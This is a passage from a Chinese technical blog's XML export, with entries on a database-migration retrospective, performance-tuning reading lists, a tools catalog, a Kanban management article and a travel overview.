<p>  回想起来，开始设计方案时想到的几个大难题，都是通过替代方案实现的：奇葩的内外网分离方案，与IT部门关于权限问题的艰难谈判，数据复制过程中及时性的要求…… 另外，还有真实割接过程中，现场压力状态的进退困境。到处都需要权衡、选择。</p>
<p>  决策是一件非常艰难的事情，受到多种因素的制约，最终的决策是一个各种利益妥协的结果。正如另一位资深哲人所说：</p>
<blockquote>
<p>项目经理首先要学会变通。</p>
</blockquote>
<p>  天下武功，无坚不摧，唯变不破。</p>
</li>
<li><p>5.2 韧性<br>  按照最初的方案，我其实并不负责这项工作，后来就算参与进来，也并不负责主导。应该说起初也有侥幸心理，希望有其他人来背这个锅。为了这次迁移，前面已经生生吓走了好几拨人。</p>
<p>  从技术上分析，我以前没怎么搞过数据库，并不具备任何优势。<br>  如果说还有一点可以凭借的东西，我感觉是韧性。面对未知的恐惧，敢于直面；面对不确定的方案，不断在尝试；面对失败的后果，坦然接受。</p>
</li>
</ul>
<h4 id="邱俊涛：如何持久化你的项目经历"><a href="#邱俊涛：如何持久化你的项目经历" class="headerlink" title="邱俊涛：如何持久化你的项目经历"></a><a href="http://abruzzi.github.com/2016/01/how-to-summarize-privious-project/">邱俊涛：如何持久化你的项目经历</a></h4><pre><code>&gt;从项目上下来之后，需要深入思考并总结之前的经验，这种深入思考会帮助你建立比较完整的知识体系，也可以让你在下一项目中更加得心应手，举一反三。如果只是蜻蜓点水般的“经历”了若干个项目，而不进行深入的总结和思考，相当于把相同的项目用不同的技术栈做了很多遍一样，那和我们平时所痛恨的重复代码又有什么不同呢？
</code></pre><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://yangtingkun.net/?p=1429">密码延迟验证导致的系统HANG住 | yangtingkun</a></li>
<li><a href="http://cholerae.com/2015/01/01/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%98%E5%BE%97%E8%BF%99%E4%B9%88%E6%85%A2%EF%BC%9F/">【翻译】为什么我的数据库变得这么慢？ | Cholerae’s Blog</a></li>
<li><a href="http://www.eygle.com/archives/2017/03/oracle_sharding.html">关于Oracle Sharding | Oracle FAQ文档翻译| eygle.com</a></li>
<li><a href="http://www.eygle.com/archives/2017/03/oracle_security_rule_16.html">防范攻击 加强管控 - Oracle数据库安全的16条军规 | eygle.com</a></li>
<li><a href="http://www.dbform.com/html/2015/2317.html">How to Analyse Row Lock Contention in Oracle 10gR2 and later | kamus</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/77618319">iptables高性能前端优化-无压力配置1w+条规则,2017| Bomb250</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDAxOTk2MQ==&amp;mid=2650272655&amp;idx=1&amp;sn=9173ca8cdeafa092f1125285909634b2&amp;chksm=be486b99893fe28ffb96e9ae713b91a73b94b71eee0b915c4a5e2c3b75cec39eca0eeb119e79&amp;mpshare=1&amp;scene=1&amp;srcid=1226Q2973ERHUtX4hUpE7tXK#rd">Oracle 数据库健康检查平台</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>性能优化技术实践</title>
    <url>/2018/11/30/Technology-Performance-Tuning/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><ol>
<li>CPU 性能优化</li>
<li>Memory 性能优化</li>
<li>IO 性能优化</li>
<li>应用性能优化</li>
<li>数据库性能优化</li>
</ol>
<h2 id="初阶课程：快速诊断实践"><a href="#初阶课程：快速诊断实践" class="headerlink" title="初阶课程：快速诊断实践"></a>初阶课程：快速诊断实践</h2><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断:负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断:快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断:Java VM</a></li>
<li><a href="#">Linux 性能诊断:Go App (规划)</a></li>
<li><a href="https://riboseyim.com/2018/06/11/Linux-Perf-App/">Linux 性能诊断:Web Server</a></li>
<li><a href="#">Linux 性能诊断:Oracle (规划)</a></li>
<li><a href="#">Linux 性能诊断:Redis (规划)</a></li>
<li><a href="#">Linux 性能诊断:Hadoop (规划)</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：启动</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：空间管理</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">操作系统原理 | How Linux Works（四）：网络管理</a></li>
</ul>
<h2 id="中阶课程：性能分析实践"><a href="#中阶课程：性能分析实践" class="headerlink" title="中阶课程：性能分析实践"></a>中阶课程：性能分析实践</h2><ul>
<li><a href="https://riboseyim.com/2018/05/18/DevOps-OpenTracing">DevOps 漫谈：分布式追踪系统体系概要</a></li>
<li><a href="https://riboseyim.com/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
</ul>
<h2 id="高阶课程：动态追踪实践"><a href="#高阶课程：动态追踪实践" class="headerlink" title="高阶课程：动态追踪实践"></a>高阶课程：动态追踪实践</h2><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考案例"><a href="#参考案例" class="headerlink" title="参考案例"></a>参考案例</h2><ul>
<li><a href="http://www.oracleonlinux.cn/category/oracle/performance-tuning/">Performance Tuning | oracleonlinux</a></li>
</ul>
<h2 id="扩展阅读：电子书《Linux-Perf-Master》"><a href="#扩展阅读：电子书《Linux-Perf-Master》" class="headerlink" title="扩展阅读：电子书《Linux Perf Master》"></a>扩展阅读：电子书《Linux Perf Master》</h2><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mindmajix.com/oracle-performance-tuning-interview-questions">Oracle Performance Tuning Interview Questions</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>TechThinking</title>
    <url>/2017/04/21/Technology-Thinking/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>From Problem to Insight</li>
<li>From input to output</li>
</ul>
<a id="more"></a>
<h2 id="From-Problem-to-Insight"><a href="#From-Problem-to-Insight" class="headerlink" title="From Problem to Insight"></a>From Problem to Insight</h2><h2 id="资料卡"><a href="#资料卡" class="headerlink" title="资料卡"></a>资料卡</h2><h4 id="20160526"><a href="#20160526" class="headerlink" title="20160526"></a>20160526</h4><p>引入新特性的同时，也意味着增加复杂度。<br>天底下的事就是这样，没有一招制敌，没有一劳永逸，完善的反馈环，健壮的体系才是王道。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="工程师的自我修养"><a href="#工程师的自我修养" class="headerlink" title="工程师的自我修养"></a>工程师的自我修养</h4><ul>
<li><a href="https://riboseyim.com/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
<li><a href="https://riboseyim.com/2017/07/05/Law-Of-Engineering/">软件工程实践中的十大法则</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title>Catalog:Tools</title>
    <url>/2016/04/26/Tools/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>场景：日常<br>场景：创作<br>场景：项目管理<br>场景：论文</p>
<span id="more"></span>
<blockquote>
<p>一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，但是逻辑是可以训练的，只要你懂的把自己的思维进行可视化的展示、分析和整理。</p>
</blockquote>
<h2 id="场景：常规活动加速器"><a href="#场景：常规活动加速器" class="headerlink" title="场景：常规活动加速器"></a>场景：常规活动加速器</h2><ul>
<li>RSS</li>
<li>OmniFouse （注意力是最稀缺资源）</li>
<li>邮件过滤器</li>
</ul>
<h2 id="场景：生产力"><a href="#场景：生产力" class="headerlink" title="场景：生产力"></a>场景：生产力</h2><ul>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/QQ20160102-9@2x.png" alt=""></p>
<h2 id="场景：创作"><a href="#场景：创作" class="headerlink" title="场景：创作"></a>场景：创作</h2><ul>
<li><a href="http://www.jianshu.com/p/7c453ce42150">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.github.io/2017/06/03/WriterToolChain/">我的写作工具链</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ulysses-版本管理.png" alt=""></p>
<h2 id="场景：项目管理"><a href="#场景：项目管理" class="headerlink" title="场景：项目管理"></a>场景：<a href="https://riboseyim.com/2019/02/06/Project/">项目管理</a></h2><ul>
<li><a href="https://riboseyim.com/2018/04/10/DevOps-Phoenix/">《凤凰项目》| 从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="场景：论文"><a href="#场景：论文" class="headerlink" title="场景：论文"></a>场景：论文</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/6S2HCDSx9ePwycHcve1Hlw">Texture：一个优雅的开源学术论文书写工具</a></li>
<li><a href="https://mp.weixin.qq.com/s/hwUKCkpvIjIDeEVKh5xF7g">Classic Papers:谷歌学术推出“经典论文”排行</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;mid=2653548870&amp;idx=1&amp;sn=9dab4a1f06e57adb2ac0393bac479c0c&amp;chksm=813a60deb64de9c833b7e871b8c50148bb481f7b438c51f254e94faf44d3ad86be5d0b958128&amp;scene=0&amp;key=74cfab3f3119748da2d7a0ea82e64160ab9461dd18defa047f3bb55115647fb8103a5af5be83873e63f07303a36a89004791c7f09bd74d9c33cf084e2248a15f0a6eb5daf56859c985fa557283166ab1&amp;ascene=0&amp;uin=Mjg2OTA0MDQ4Mg%3D%3D">Ariel Diaz:适合创业团队的必备工具栈</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Mac</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈:看板Kanban管理实践</title>
    <url>/2017/08/06/TeamWork-Kanban/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Kanban看板是一种可视化生产管理系统，利用看板卡来增强信号量、标记生产过程，促进系统渐进式变化，提高团队协作的效率。</p>
<ul>
<li>核心理论：流动性、可视化</li>
<li>实践方法：看板设计模式、可视化技巧、平衡群体智慧和个体差异</li>
</ul>
<blockquote>
<p>目标是 <strong>提高整个系统的生产能力，不只是提高任务的完成数量</strong>。——《凤凰项目 一个IT运维的传奇故事》第 193 页</p>
</blockquote>
<span id="more"></span>
<h2 id="一、Kanban看板核心理论"><a href="#一、Kanban看板核心理论" class="headerlink" title="一、Kanban看板核心理论"></a>一、Kanban看板核心理论</h2><h4 id="1、起源"><a href="#1、起源" class="headerlink" title="1、起源"></a>1、起源</h4><p>Kanban(看板)是一种生产管理系统，起源于1940年代的丰田汽车公司的 TPS (Toyota Production System)。简单来说看板是一系列简单的视觉符号，它的出现是为了达到即时化生产（Just in time，JIT），JIT认为库存会带来成本以及浪费，而不是增加或储存价值，这与传统会计学不同，它鼓励企业逐步消除库存，以便削减生产流程中的成本，在管理中逐渐适应“零库存”的状态。<br><img src="http://riboseyim-qiniu.riboseyim.com/Kanban_Toyota.gif" alt=""></p>
<h4 id="2、BASIC-of-Kanban：流动性"><a href="#2、BASIC-of-Kanban：流动性" class="headerlink" title="2、BASIC of Kanban：流动性"></a>2、BASIC of Kanban：流动性</h4><p><strong>Cycle Time = Work in Progress / Throughput</strong><br>Kanan 看板系统的基础理论是利特尔法则（ Little’s Law），由MIT （Sloan School of Management）的教授John Little于1961年提出：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。</p>
<blockquote>
<p>the relationship between the average number of customers in a store, their arrival rate, and the average time in the store.</p>
</blockquote>
<p>根据利特尔法则，跟踪工作及其进展的最重要的目标是：限制在制品（Work in process，WIP），例如尚未完成制造过程的商品，或是停留在库存仓库或是产线上，等待着进一步处理的商品。</p>
<blockquote>
<p>高质量地完成工作只有在工作以可持续的节奏流动时才有可能。发现并维持这一节奏只有在在制品小于团队产能的情况下才有可能。— Jim Benson  《Personal Kanban》作者</p>
</blockquote>
<p>看板的主要部分是故事卡片（Story Cards），上面显示了你和你的团队所需的所有必要信息。在基本设置中，故事卡片分为三个主要阶段（列）——To Do(计划做的事情）、In Progress (正在进行)、Done(完成)。根据实际的需要，还可以分为多个阶段。你也可以使用泳道任务（swimlanes）拆分为不同类别，最后根据进程随时移动状态和泳道之间的问题。</p>
<h4 id="3、可视化工作区"><a href="#3、可视化工作区" class="headerlink" title="3、可视化工作区"></a>3、可视化工作区</h4><blockquote>
<p>The power of Little’s Law to Kanban teams is not its ability to predict WIP, Thoughput or Leadtime. The true power lies in its ability to influence team behavior with its underlying assumptions.</p>
</blockquote>
<p>像看板这样的可视化系统因我们对视觉信息的偏好而成为了强有力的工具。真实地看到工作和流程有助于理解。看板墙可以作为一个简单的信息节点，使任何人都能走过来并了解项目的当前状态。— Jim Benson  《Personal Kanban》作者</p>
<p>看板方法要求团队将组织处理信号的规则显式化，利用精益度量体系对系统及时进行分析回顾，不断优化信号处理模式。这就形成了一个<strong>完整高效的反馈闭环</strong>，最终建立一个具备自我完善能力，并能随着组织发展和环境变化不断演进的自适应系统。— 李兴双 中国工商银行软件开发中心</p>
<p>Kanban看板可视化的一些技巧：</p>
<ul>
<li>Kanban看板墙需放置于工作区醒目位置</li>
<li>不同事件类别使用不同颜色，紧急事件（URGENT）使用醒目颜色（红色）</li>
<li>故事卡片常规要素：编号，标题，负责人，截止日期</li>
<li>故事卡片叠加要素：重要度，约束条件，延期原因等特殊描述</li>
<li>照相机定期快照（周），及时复盘总结（月）</li>
<li>限制进行中（In-Process）事件数量，限制已经完成（Done）事件数量（折叠或者更换新的Kanban看板墙）</li>
</ul>
<p>总之，Kanban看板系统的本质意义在于促进团队成员对作业流程、过程和风险达成共同理解, 可视化的作用在于增强不确定风险的信息量（故障、阻碍因子、延期原因、特殊要求等），促进系统各方及时作出响应，或者通过快照机制随时复盘、研究改进措施。</p>
<h2 id="二、Kanban看板实践注意事项"><a href="#二、Kanban看板实践注意事项" class="headerlink" title="二、Kanban看板实践注意事项"></a>二、Kanban看板实践注意事项</h2><h4 id="1、看板墙设计模式"><a href="#1、看板墙设计模式" class="headerlink" title="1、看板墙设计模式"></a>1、看板墙设计模式</h4><blockquote>
<p><strong> Conway’s law：Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.</strong></p>
</blockquote>
<p>康威定律指出：任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致。设计一套可以落地的看板墙规则，第一个步骤不是按照教科书照搬其他企业的看板墙风格，而应首先画出自己所在组织的架构图。其内容包括管理架构、关联方和关注重点，在此基础之上再设计横坐标（Workflow）与纵坐标（Items）, 应当尽可能地使看板墙符合组织结构，而不是相反。</p>
<p>规模的增长很容易让工作陷入停滞，沟通成本加上工作划分会导致效率变化。具体表现为团队之间在工作时间里召开的沟通会议呈指数增长，不同团队的工作量差别很大，不同团队的工作节奏紊乱脱节。Kanban看板实践中，应考虑上述情况，在技术上作出特殊处理：例如当团队规模较大时，对看板墙进行拆分，不同的业务单元使用不同的看板，综合管控部门聚焦于较大标的，而技术实现部门侧重于细节。切记只有当工作可以划分时，你才可能通过增加团队成员来提高效率。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Kanban_Pattern_DevOps.png" alt=""></p>
<h4 id="2、平衡群体智慧与个体差异"><a href="#2、平衡群体智慧与个体差异" class="headerlink" title="2、平衡群体智慧与个体差异"></a>2、平衡群体智慧与个体差异</h4><blockquote>
<p>保持群体智慧的唯一方式是保护每个人的独立性。—乔纳-莱勒（Jonah Lehrer）</p>
</blockquote>
<p>群体会对特定类型的问题给出较好的答案。当大量的人做出回应时，他们产生了很多答案，但其平均值、中位数或最常见的回答往往会是一个很好的答案。这比人们被彼此隔离来发表独立意见更为可行。……但是，当人们看到别人提供的答案后，就出现了一些不好的事情。人们会修改自己的答案，从而造成最后的答案集合变得不够多样化，这样最好的答案就可能无法脱颖而出。人们通过强化会变得更加自信，但是精确度却没有改进。<strong>群体智慧依赖于多样性和独立性</strong>。在社交网络上（以及在企业、组织和政府机构工作的人员团队中），<strong>同事压力和主导人物可能会降低该团体的智慧</strong>。（《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase）</p>
<p>具体落地实践中，需要承认不同团队、不同团队成员的个体差异。这里所说的个体差异主要表表现为性格差异，它通过人对事物的倾向性态度、意志、语言、逻辑、行为方式等方面表现出来。一般情况下，随机组成的团队成员之间，心理风格的差异会非常显著。例如在感知方面，可以划分为亢奋敏感型、被动感知型等；在信息反馈习惯上，存在主动型和滞后型；在计划性方面也有不同的偏好倾向，有人喜欢按部就班的任务模式，有人善于临机应变，处置紧急情况更能触发神经亢奋，然前者则容易陷入焦虑和挫败感。组织模式可以简化为两种，矩阵式：适用于团队成员之间技能、心理强度较为均匀的理想情况；另外一种是集中式：由一名心理风格较为平和的成员负责日常沟通、统一维护看板墙，即适当缓冲敏感型成员的过度信息输出，另外主动轮询其它被动型成员。<br><img src="http://riboseyim-qiniu.riboseyim.com/Kanban_Pattern_Org.png" alt=""></p>
<h4 id="3、慎用“高级”看板"><a href="#3、慎用“高级”看板" class="headerlink" title="3、慎用“高级”看板"></a>3、慎用“高级”看板</h4><p>不管什么时代什么组织，优秀管理的本质就是鼓励准确信息迅速向上、横向和向下传递，而最重要的是向上传递。在Kanban看板实践中，我目前的判断是不建议套用倾向量化方案的“高级”看板。</p>
<p>麦克纳马拉曾在福特汽车公司和五角大楼都创下管理奇迹的“神童”，在越南战争中使用量化准则来指挥越战，却导致越战的美军在结构上鼓励虚假信息向上传递：军队从上到下都渴望好消息，于是心照不宣地制造、传递假消息，甚至发明出所谓“尸体数”、“小便数”等荒唐可笑的考核指标，造成严重后果。麦克纳马拉也因为自己的过于“聪明”、刚愎自用，在战争决策上神话破产、风光不再。</p>
<blockquote>
<p>“每个定量指标都表明我们正在打胜仗。— 麦克纳马拉”</p>
</blockquote>
<p>量化的破坏性经常被人忽略：第一，机会成本。量化是很耗时的，大量宝贵的管理时间浪费在量化上，做其他重要事情的时间就减少了。第二，量化容易误导决策。定量信息造成了各种各样错得离谱的决策。</p>
<p>当你的组织还远远没有达到精益生产、杜绝延期的境界之前，将敏捷的Kanban看板应用急用进入量化范畴，是不明智的。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Kanban_Pattern_YR_201707.png" alt=""></p>
<h4 id="扩展阅读：DevOps-漫谈系列"><a href="#扩展阅读：DevOps-漫谈系列" class="headerlink" title="扩展阅读：DevOps 漫谈系列"></a>扩展阅读：<a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></li>
</ul>
<h4 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h4><h4 id="《个人看板：了解工作-驾驭生活》（PersonalKanban-MappingWork-NavigatingLife）"><a href="#《个人看板：了解工作-驾驭生活》（PersonalKanban-MappingWork-NavigatingLife）" class="headerlink" title="《个人看板：了解工作/驾驭生活》（PersonalKanban:MappingWork|NavigatingLife）"></a>《个人看板：了解工作/驾驭生活》（PersonalKanban:MappingWork|NavigatingLife）</h4><ul>
<li>作者：吉姆·本森、托尼安妮·德马里亚·巴里</li>
<li>简介：与其说这是一本关于复杂价值流的书，还不如说是一本关于个人工作效率的书。</li>
</ul>
<h4 id="《看板方法：科技企业渐进变革成功之道》"><a href="#《看板方法：科技企业渐进变革成功之道》" class="headerlink" title="《看板方法：科技企业渐进变革成功之道》"></a>《看板方法：科技企业渐进变革成功之道》</h4><ul>
<li>Kanban : Successful Evolutionary Change for Your Technology Business</li>
<li>作者：戴维·J.安德森</li>
<li>简介：对于在企业中如何使用看板图描述得更加具体。</li>
</ul>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.youtube.com/watch?v=ufCa1VlItLA">Marcus Hammarberg:Kanban in Action  (Youtube Video)</a></li>
<li><a href="http://itsadeliverything.com/littles-law-the-basis-of-lean-and-kanban">Steven Tomas:Little’s Law – the basis of Lean and Kanban</a></li>
<li><a href="http://3.droppdf.com/files/p99PT/kanban-in-action.pdf">PDF《kanban in Action》</a></li>
<li><a href="http://www.toyota-global.com/company/vision_philosophy/toyota_production_system/just-in-time.html">Just-in-Time — Philosophy of complete elimination of waste</a></li>
<li><a href="http://www.thepaper.cn/newsDetail_forward_1365119_1">澎湃新闻：麦克纳马拉：以铁腕重塑五角大楼，却因越战一败涂地</a></li>
<li><a href="http://www.infoq.com/cn/articles/kanban-development-method">何勉：解析精益产品开发（一）—— 看板开发方法</a></li>
<li><a href="https://www.infoq.com/articles/hiranabe-lean-agile-kanban">Kanban Applied to Software Development: from Agile to Lean</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>旅行 | Overview of Travel</title>
    <url>/2017/04/20/Travel/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="游历之道"><a href="#游历之道" class="headerlink" title="游历之道"></a>游历之道</h2><blockquote>
<p>凡游历之道有二：一者看山水明秀、花木之红翠，或翫（同“玩”）州府之繁华，或赏寺观之楼阁，或寻朋友以纵意，或为衣食而留心，如此之人，虽行万里之途，劳形费力，遍览天下之景，心乱气衰，此乃虚云游之人。二者，参寻性命，求问妙玄，登巇崄之高山，访明师之不惓，渡喧轰之远水，问道无厌。若一句相投，便有圆光内发，了生死之大事，作全真之丈夫。如此之人，乃真云游也！<br>——-王重阳《重阳立教十五论 》</p>
</blockquote>
<p>《重阳立教十五论》为世界道教主流全真道的经典论著。全真开化辅极帝君王重阳撰，一卷。主要内容为：凡出家先须投庵。身依心安；云游访师 ，参寻性命；学书宜采意心解；精研药物，活人性命；以丛林为立身 之本；静坐须心如泰山，剪除念想以定心；调和五行精气於一身， 以正配五气；修炼性命；入圣之道须积功累行；超越欲界、色界、无色界；养身之法在於得道多养；超离凡世等十五条。该书论述了全真道创教的基本宗旨，规定了类严格的修道戒规，融合儒释道三家精华，为研究全真道的重要经典文献。收入《正统道藏》正一部。</p>
<h2 id="战略之道"><a href="#战略之道" class="headerlink" title="战略之道"></a>战略之道</h2><p>罗伯特·D.卡普兰，地缘政治分析家。1952年生于纽约，长期为《大西洋月刊》《纽约时报》《华盛顿邮报》《新共和》《华尔街日报》《国际利益》等媒体撰写评论，出版的著作有《阿拉伯人》《地球末日》《帝国的野蛮》《地中海之冬》《季风帝国》《地理的复仇》《在欧洲的阴影下》《南海困局》等。</p>
<h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching-GZ-Wetland/" target="_blank" rel="noopener">旅行指南|湿地公园</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/" target="_blank" rel="noopener">旅行指南|江南园林</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/" target="_blank" rel="noopener">旅行指南|珠海航空航天展览</a></li>
<li><a href="https://artsandculture.google.com/streetview/british-museum/AwEp68JO4NECkQ?sv_h=326&amp;sv_p=0&amp;sv_pid=JeKwUFYAMWXNWPh3IOg3jw&amp;sv_lid=3582009757710443819&amp;sv_lng=-0.12660245092570221&amp;sv_lat=51.51905368906714&amp;sv_z=0.9999999999999997" target="_blank" rel="noopener">旅行指南|大英博物馆（谷歌地图在线）</a></li>
</ul>
